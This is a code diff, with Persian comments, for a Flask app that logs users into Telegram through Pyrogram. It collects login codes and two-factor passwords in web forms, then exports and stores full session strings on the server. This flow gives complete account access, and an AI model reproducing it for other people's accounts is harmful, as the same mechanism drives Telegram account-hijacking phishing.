@@ -65,6 +65,10 @@ def get_user(phone):
 
 init_db()
 
+# ========== دیکشنری برای نگهداری Clientهای فعال ==========
+# { phone: {"client": Client, "hash": str, "lock": asyncio.Lock} }
+active_clients = {}
+
 # ========== اجرای async در Flask ==========
 def run_async(coro):
     """اجرای یک تابع async و برگرداندن نتیجه"""
@@ -73,72 +77,87 @@ def run_async(coro):
     except Exception as e:
         return f"error: {str(e)}"
 
-# ========== توابع Pyrogram ==========
+# ========== توابع Pyrogram (با Client مشترک) ==========
 async def send_code_async(phone):
-    """ارسال کد و برگرداندن phone_code_hash"""
+    """ارسال کد و ذخیره Client در دیکشنری برای مراحل بعد"""
+    # اگر قبلاً کلاینتی برای این شماره هست، اون رو disconnect کن
+    if phone in active_clients:
+        try:
+            await active_clients[phone]["client"].disconnect()
+        except:
+            pass
+        active_clients.pop(phone, None)
+
     client = Client("temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
     await client.connect()
     try:
         sent = await client.send_code(phone)
+        # ذخیره Client و hash در دیکشنری
+        active_clients[phone] = {
+            "client": client,
+            "hash": sent.phone_code_hash
+        }
         return sent.phone_code_hash
     except PhoneNumberInvalid:
+        await client.disconnect()
         return None
     except Exception as e:
-        return f"error: {str(e)}"
-    finally:
         await client.disconnect()
+        return f"error: {str(e)}"
 
-async def sign_in_async(phone, phone_code_hash, code):
-    """تایید کد با استفاده از phone_code_hash"""
-    client = Client("temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
-    await client.connect()
+async def sign_in_async(phone, code):
+    """تایید کد با استفاده از Client ذخیره‌شده"""
+    if phone not in active_clients:
+        return "error: session expired, please resend code"
+
+    data = active_clients[phone]
+    client = data["client"]
+    phone_code_hash = data["hash"]
+
     try:
         await client.sign_in(
             phone_number=phone,
             phone_code_hash=phone_code_hash,
             phone_code=code
         )
+        # لاگین موفق - سشن رو بگیر
         session_string = await client.export_session_string()
+        await client.disconnect()
+        active_clients.pop(phone, None)  # پاک کردن از دیکشنری
         return session_string
     except SessionPasswordNeeded:
+        # رمز دوم لازمه - کلاینت رو نگه دار، فقط وضعیت رو برگردون
         return "need_password"
     except PhoneCodeInvalid:
+        await client.disconnect()
+        active_clients.pop(phone, None)
         return "invalid_code"
     except PhoneCodeExpired:
+        await client.disconnect()
+        active_clients.pop(phone, None)
         return "code_expired"
     except Exception as e:
-        return f"error: {str(e)}"
-    finally:
         await client.disconnect()
+        active_clients.pop(phone, None)
+        return f"error: {str(e)}"
 
-async def check_password_async(phone, phone_code_hash, code, password):
-    """تایید رمز دوم برای اکانت‌های دارای Two-Factor Authentication"""
-    client = Client("temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
-    await client.connect()
+async def check_password_async(phone, password):
+    """تایید رمز دوم با استفاده از Client ذخیره‌شده"""
+    if phone not in active_clients:
+        return "error: session expired, please resend code"
+
+    client = active_clients[phone]["client"]
+
     try:
-        await client.sign_in(
-            phone_number=phone,
-            phone_code_hash=phone_code_hash,
-            phone_code=code
-        )
-        # اگر اینجا خطا نخورد، یعنی رمز دوم نداشته (اما قبلاً need_password برگشته بود)
-        # پس باید check_password رو صدا بزنیم
         await client.check_password(password)
         session_string = await client.export_session_string()
-        return session_string
-    except SessionPasswordNeeded:
-        # اگه هنوز نیاز به رمز دوم داره (حالت عادی)
-        await client.check_password(password)
-        session_string = await client.export_session_string()
-        return session_string
-    except PhoneCodeInvalid:
-        return "invalid_code"
-    except PhoneCodeExpired:
-        return "code_expired"
-    except Exception as e:
-        return f"error: {str(e)}"
-    finally:
         await client.disconnect()
+        active_clients.pop(phone, None)
+        return session_string
+    except Exception as e:
+        await client.disconnect()
+        active_clients.pop(phone, None)
+        return f"error: {str(e)}"
 
 async def get_groups_async(session_string):
     """دریافت لیست گروه‌ها با سشن استرینگ"""
@@ -180,28 +199,23 @@ def send_code_route():
     else:
         # result = phone_code_hash
         session['phone'] = phone
-        session['phone_code_hash'] = result
         return render_template('code.html')
 
 @app.route('/verify_code', methods=['POST'])
 def verify_code():
     code = request.form.get('code', '').strip()
     phone = session.get('phone')
-    phone_code_hash = session.get('phone_code_hash')
 
-    if not phone or not phone_code_hash:
+    if not phone:
         return redirect(url_for('index'))
 
-    result = run_async(sign_in_async(phone, phone_code_hash, code))
+    result = run_async(sign_in_async(phone, code))
 
     if result == "need_password":
-        # کد رو برای مرحله رمز دوم نگه دار
-        session['code'] = code
         return render_template('password.html')
     elif result == "invalid_code":
         return "کد تایید نامعتبر است", 400
     elif result == "code_expired":
-        session.clear()
         return "کد تایید منقضی شده است. از اول شماره رو وارد کن.", 400
     elif isinstance(result, str) and result.startswith("error"):
         return f"خطا: {result}", 500
@@ -209,8 +223,6 @@ def verify_code():
         # سشن استرینگ معتبر
         save_user(phone, result)
         session['session_string'] = result
-        session.pop('phone_code_hash', None)
-        session.pop('code', None)
         return redirect(url_for('dashboard'))
     else:
         return f"خطای ناشناخته: {result}", 500
@@ -219,26 +231,17 @@ def verify_code():
 def verify_password():
     password = request.form.get('password', '').strip()
     phone = session.get('phone')
-    phone_code_hash = session.get('phone_code_hash')
-    code = session.get('code')
 
-    if not phone or not phone_code_hash or not code or not password:
+    if not phone or not password:
         return redirect(url_for('index'))
 
-    result = run_async(check_password_async(phone, phone_code_hash, code, password))
+    result = run_async(check_password_async(phone, password))
 
     if isinstance(result, str) and result.startswith("error"):
         return f"خطا: {result}", 500
-    elif result == "invalid_code":
-        return "کد تایید نامعتبر است", 400
-    elif result == "code_expired":
-        session.clear()
-        return "کد تایید منقضی شده است. از اول شماره رو وارد کن.", 400
     elif isinstance(result, str) and len(result) > 50:
         save_user(phone, result)
         session['session_string'] = result
-        session.pop('phone_code_hash', None)
-        session.pop('code', None)
         return redirect(url_for('dashboard'))
     else:
         return f"خطای ناشناخته: {result}", 500
@@ -274,6 +277,14 @@ def save_groups():
 
 @app.route('/logout')
 def logout():
+    # پاک کردن Client فعال
+    phone = session.get('phone')
+    if phone and phone in active_clients:
+        try:
+            asyncio.run(active_clients[phone]["client"].disconnect())
+        except:
+            pass
+        active_clients.pop(phone, None)
     session.clear()
     return redirect(url_for('index'))
 
